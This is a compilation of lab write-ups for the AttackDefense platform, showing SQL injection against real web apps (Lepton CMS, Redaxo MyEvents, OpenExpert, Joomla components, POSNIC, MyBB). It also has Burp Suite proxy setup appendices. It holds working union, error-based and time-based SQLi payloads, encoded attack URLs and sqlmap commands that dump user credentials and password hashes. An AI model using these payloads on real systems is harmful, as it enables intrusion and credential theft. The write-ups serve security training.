The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
Lepton CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=273  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “lepton cms sql injection” and look for publically available exploits.  
 
 
 
 
The exploit db link contains the SQLI Payload and the information regarding the vulnerable 
parameter and the vulnerable web page.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40800 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application. 
 
The admin portal of the web application is at “/admins” directory.  
 
 
 
 
 
 
 
 
 
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password 
 
 
 
 
 
 
Step 4: ​According to the information present at exploit db link, the “terms” parameter of the 
page search is vulnerable to SQL injection. Navigate to the Page tab and find the textbox which 
corresponds to “terms” parameter.  
 
Click on Page tab. 
 
 
 
Right click on the textbox in the “Search page” section and click “Inspect”.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The textbox in the “Search Page” section corresponds to the “terms” parameter. 
 
 
 
 
Step 5: ​Inject the payload provided in the POST request at  the exploit db link and exploit the 
vulnerability.  
 
Payload: ​" union select 
username,2,3,4,5,6,password,email,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 from 
lep_users -- - 
 
 
 
Click on the Search Button. 
 
 
 
The username and password hash of the Lepton user is revealed. 
 
Step 6: ​Modify the payload and repeat the previous step to retrieve the MySQL server version 
information.  
 
Modified Payload: ​" union select 
version(),2,3,4,5,6,password,email,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 from 
lep_users -- - 
 
 
 
Click on the Search Button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The MySQL Server version is revealed.  
 
 
References:  
 
1.
LEPTON CMS (​https://lepton-cms.org/english.php​)  
2.
LEPTON 2.2.2 - SQL Injection (​https://www.exploit-db.com/exploits/40800​)  
 
 
 
 
 
Name 
Redaxo MyEvents Plugin 
URL 
https://www.attackdefense.com/challengedetails?cid=274  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Redaxo MyEvents Plugin sql injection” and look for publically 
available exploits.  
 
 
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44261 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application.  
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password 
 
 
 
Dashboard:  
 
 
 
Step 4: ​Navigate to the vulnerable URL provided at exploit db link and intercept the request with 
Burp suite.  
 
Check Appendix to learn how to configure Burp Suite. 
 
 
URL: 
http://cc141qkimvk4tenvn2fdvmjcs.public1.attackdefenselabs.com/redaxo/redaxo/index.php?pa
ge=myevents/event_add&myevents_id=123 
 
 
 
 
The request was intercepted by burp suite. 
 
Intercepted Request: 
 
Copy the request and save it in a file named “request”. 
 
Command: ​cat request 
 
 
 
Turn off the intercept in burp suite.  
 
 
Step 5: ​Find the payload using sqlmap. 
 
Vulnerable URL: ​redaxo/redaxo/index.php?page=myevents/event_add&myevents_id=123 
 
 
 
Vulnerable parameter:​  myevents_id 
 
Command: ​sqlmap -r request -p myevents_id --dbms mysql --level 5 --risk 3 
 
 
Enter the following answers when asked for questions. 
 
“C” for “how do you want to proceed?” 
“n” for “Do you want to try with a random integer value for option '--union-char' ?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Payloads:  
 
Type: ​error-based 
Payload​: page=myevents/event_add&myevents_id=asd AND (SELECT 9583 FROM(SELECT 
COUNT(*),CONCAT(0x7162717871,(SELECT 
(ELT(9583=9583,1))),0x716a716271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
Type:​ AND/OR time-based blind 
Payload:​ page=myevents/event_add&myevents_id=asd AND (SELECT * FROM 
(SELECT(SLEEP(5)))lcAZ) 
 
Type:​ UNION query 
Payload:​ page=myevents/event_add&myevents_id=-8720 UNION ALL SELECT 
8290,8290,8290,8290,8290,8290,8290,8290,8290,8290,8290,8290,8290,CONCAT(0x7162717
871,0x577a6f42454c53594f676c47416b6463464d67694e5448754e61475745774676527a7648
56646471,0x716a716271)-- Smgp 
 
 
 
Step 6: ​Using the error based payload, form the URL required to exploit the vulnerability.  
 
Payload: ​page=myevents/event_add&myevents_id=asd AND (SELECT 9583 FROM(SELECT 
COUNT(*),CONCAT(0x7162717871,(SELECT 
(ELT(9583=9583,1))),0x716a716271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
URL: 
http://cc141qkimvk4tenvn2fdvmjcs.public1.attackdefenselabs.com/redaxo/redaxo/index.php?pa
ge=myevents/event_add&myevents_id=page=myevents/event_add&myevents_id=asd%20AND
%20(SELECT%209583%20FROM(SELECT%20COUNT(*),CONCAT(0x7162717871,(SELECT
%20(ELT(9583=9583,1))),0x716a716271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION
_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) 
 
 
 
Step 7: ​Modify the payload used in previous step and retrieve the MySQL server version 
information. 
 
Payload: ​page=myevents/event_add&myevents_id=asd AND (SELECT 9583 FROM(SELECT 
COUNT(*),CONCAT(version(),(SELECT 
(ELT(9583=9583,1))),0x716a716271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
URL: 
http://cc141qkimvk4tenvn2fdvmjcs.public1.attackdefenselabs.com/redaxo/redaxo/index.php?pa
ge=myevents/event_add&myevents_id=page=myevents/event_add&myevents_id=asd%20AND
%20(SELECT%209583%20FROM(SELECT%20COUNT(*),CONCAT(version(),(SELECT%20(E
LT(9583=9583,1))),0x716a716271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCH
EMA.PLUGINS%20GROUP%20BY%20x)a) 
 
 
 
 
The MySQL Server version information was revealed. 
 
References:  
 
1.
REDAXO-AddOn: MyEvents (​https://github.com/wende60/myevents​) 
 
2.
Redaxo CMS Addon MyEvents 2.2.1 - SQL Injection 
(​https://www.exploit-db.com/exploits/40396​) 
 
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
Open Expert 
URL 
https://www.attackdefense.com/challengedetails?cid=275  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “OpenExpert sql injection” and look for publically available exploits.  
 
 
 
 
The exploit db link contains sqlmap output which can be used to exploit the SQL Injection 
vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41087 
 
 
 
 
Step 3: ​The vulnerable parameter and the SQLI payload is provided in the sqlmap output. From 
the information provided at the exploit db link, form the URL required to exploit the vulnerability.  
 
Payload: ​area_id=1 AND (SELECT 8855 FROM(SELECT 
COUNT(*),CONCAT(0x7171706a71,(SELECT 
(ELT(8855=8855,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
 
 
 
URL: 
http://xv2wime23af1tpjrji22ov1b4.public2.attackdefenselabs.com/expert_wizard.php?area_id=1
%20AND%20(SELECT%208855%20FROM(SELECT%20COUNT(*),CONCAT(0x7171706a71,(
SELECT%20(ELT(8855=8855,1))),0x71626b7871,FLOOR(RAND(0)*2))x%20FROM%20INFOR
MATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) 
 
 
 
 
The injected SQLI Payload was executed.  
 
 
Step 4: ​Modify the URL used in the previous step to retrieve the MySQL server version 
information.  
 
Modified Payload: ​area_id=1 AND (SELECT 8855 FROM(SELECT 
COUNT(*),CONCAT(version(),(SELECT 
(ELT(8855=8855,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
URL: 
http://xv2wime23af1tpjrji22ov1b4.public2.attackdefenselabs.com/expert_wizard.php?area_id=1
%20AND%20(SELECT%208855%20FROM(SELECT%20COUNT(*),CONCAT(version(),(SELE
CT%20(ELT(8855=8855,1))),0x71626b7871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATI
ON_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) 
 
 
 
 
 
The MySQL Server version is revealed.  
 
 
References:  
 
1.
OpenExpert (​https://sourceforge.net/projects/law-expert/​)  
2.
Openexpert 0.5.17 - 'area_id' SQL Injection (​https://www.exploit-db.com/exploits/41087​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
Name 
Joomla com_kunena Component 
URL 
https://www.attackdefense.com/challengedetails?cid=316  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “Joomla com_kunena Component sql injection” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the perl script required to exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/22153 
 
 
 
Step 3: ​Save the perl script provided at the Exploit DB link as sqli.pl 
 
Command: ​cat sqli.pl 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Run the perl script to exploit the web application. 
 
Command: ​perl sqli.pl 
 
Enter the URL of the vulnerable web application 
 
 
 
The password of the Joomla user was dumped by the exploitation script.  
 
 
 
 
 
References:  
 
1.
Kunena (​https://extensions.joomla.org/extension/kunena/​)  
2.
Joomla! Component com_kunena - 'search' SQL Injection 
(​https://www.exploit-db.com/exploits/22153​)  
 
 
 
 
 
Name 
POSNIC Stock Management System 
URL 
https://www.attackdefense.com/challengedetails?cid=317  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “POSNIC Stock Management System sql injection” and look for 
publically available exploits.  
 
 
 
There are two exploit db link. The first one contains a php script which can be used to exploit 
the SQL injection vulnerability.  The second exploit db link contains the SQL Injection payload 
required to bypass the question and answer check in the forgot password system of the web 
application. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/28563 
 
 
 
 
 
Step 3: ​Click on the “Forgot your password?” link on the homepage of the web application. 
 
 
 
Step 4: ​Inject the payload in the text box and exploit the SQL Injection vulnerability. 
 
 
Click on Submit button 
 
 
 
The check was bypassed and the admin user’s password was revealed.  
 
 
 
 
References:  
 
1.
Posnic Stock Management System 1.02 - Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/28563​)  
 
 
 
 
 
Name 
Joomla com_hdflvplayer Component 
URL 
https://www.attackdefense.com/challengedetails?cid=318  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “Joomla com_hdflvplayer Component sql injection” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the python script which can be used to exploit the SQL Injection 
vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/35220 
 
 
 
Step 3: ​Save the python script provided at the exploit db link as exploit.py 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
Step 4: ​Find the usage information of the exploitation script. 
 
Command: ​python exploit.py 
 
 
 
 
 
 
 
The exploitation script requires the URL of the vulnerable web application to be passed as an 
argument. 
 
Step 5: ​Run the exploitation script with required parameters and exploit the vulnerability. 
 
Command:  
python exploit.py -t http://5fgyl5iodmlgvq3yt0eu6jpny.public1.attackdefenselabs.com/joomla/ 
 
 
 
 
 
 
 
 
 
 
The exploitation script has dumped the username of the MySQL user. It has also provided the 
URL required to exploit the vulnerability.  
 
URL: 
http://5fgyl5iodmlgvq3yt0eu6jpny.public1.attackdefenselabs.com/joomla//index.php?option=com
_hdflvplayer&id=-9404%20UNION%20ALL%20SELECT%20CONCAT%280x68306d336c34623
174%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%2
9%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CN
ULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CN
ULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 
 
 
 
The username of the MySQL User was revealed.  
 
Step 6: ​Modify the URL obtained in previous step to retrieve the MySQL Server version 
information. 
 
Modified URL: 
http://5fgyl5iodmlgvq3yt0eu6jpny.public1.attackdefenselabs.com/joomla//index.php?option=com
_hdflvplayer&id=-9404%20UNION%20ALL%20SELECT%20CONCAT%28version()%2CIFNUL
L%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162
346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL
%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL
%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 
 
 
References:  
 
1.
HD FLV Player (​https://extensions.joomla.org/extension/hd-flv-player/​)  
2.
Joomla! Component com_hdflvplayer < 2.1.0.1 - SQL Injection 
(​https://www.exploit-db.com/exploits/35220​)  
 
 
 
Name 
MyBB 
URL 
https://www.attackdefense.com/challengedetails?cid=444  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “MyBB SQL Injection” and look for publically available exploits.  
 
 
 
 
 
The exploit db link contains the SQLI payload and the information about the vulnerable 
parameter. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40396  
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application.  
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password1 
 
Click on the Login button and enter the credentials. 
 
 
 
Click on the Login button. 
 
 
 
Open the administration panel. Click on “Admin CP” hyperlink below the welcome message.  
 
  
 
Enter the same credentials. 
 
 
 
Step 4: ​Navigate to the configuration tab and select the “Forum display options” ( For which the 
gid parameter value is 7) 
 
 
Click on Forum Display Options (The gid parameter value for this option is 7, this can be figured 
out by hovering over the option and looking for the URL which appears on the left/right corner). 
 
 
 
 
 
 
 
 
Step 5: ​To exploit the SQLI vulnerability, it is required to save the settings with the injected 
SQLI payload in the threadsperpage parameter. Click on the “Save Settings” button and 
intercept the request with Burp suite.  
 
Check Appendix to learn how to configure Burp Suite. 
 
 
 
 
 
 
The request was intercepted by burp suite. 
 
 
Step 6: ​Inject the payload provided at exploit db link into the request and forward the request 
 
Modify the POST data in the request:  
 
Before:  
my_post_key=a1cc6d9ac866a92f36fe05d5f314252a&gid=7&upsetting%5Bthreadsperpage%5D
=20&upsetting%5Bhottopic%5D=20&upsetting%5Bhottopicviews%5D=150&upsetting%5Busert
ppoptions%5D=10%2C15%2C20%2C25%2C30%2C40%2C50&upsetting%5Bdotfolders%5D=1
&upsetting%5Ballowthreadratings%5D=1&upsetting%5Bbrowsingthisforum%5D=1&upsetting%
5Bannouncementlimit%5D=2&upsetting%5Breadparentforums%5D=0 
 
 
 
After:  
my_post_key=a1cc6d9ac866a92f36fe05d5f314252a&gid=7&upsetting%5Bthreadsperpage%5D
=20 procedure 
analyse(extractvalue(rand(),concat(0x3a,version())),1);&upsetting%5Bhottopic%5D=20&upsettin
g%5Bhottopicviews%5D=150&upsetting%5Busertppoptions%5D=10%2C15%2C20%2C25%2C
30%2C40%2C50&upsetting%5Bdotfolders%5D=1&upsetting%5Ballowthreadratings%5D=1&up
setting%5Bbrowsingthisforum%5D=1&upsetting%5Bannouncementlimit%5D=2&upsetting%5Br
eadparentforums%5D=0 
 
 
Forward the request.  
 
 
 
 
 
The settings were saved successfully.  
 
Step 7: ​Visit the forum to trigger the injected SQLI payload. 
 
Navigate to the homepage of the web application. 
 
URL: ​http://x9xgp39kes3krqh6x1riqbcdx.public2.attackdefenselabs.com 
  
 
 
Click on the “My Forum” hyperlink and the injected SQLI payload will be executed.  
 
 
 
 
 
 
 
 
 
 
 
The MySQL Server version information was revealed. 
 
References:  
 
1.
MyBB (​https://mybb.com/​) 
 
2.
MyBB 1.8.6 - SQL Injection (​https://www.exploit-db.com/exploits/40396​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
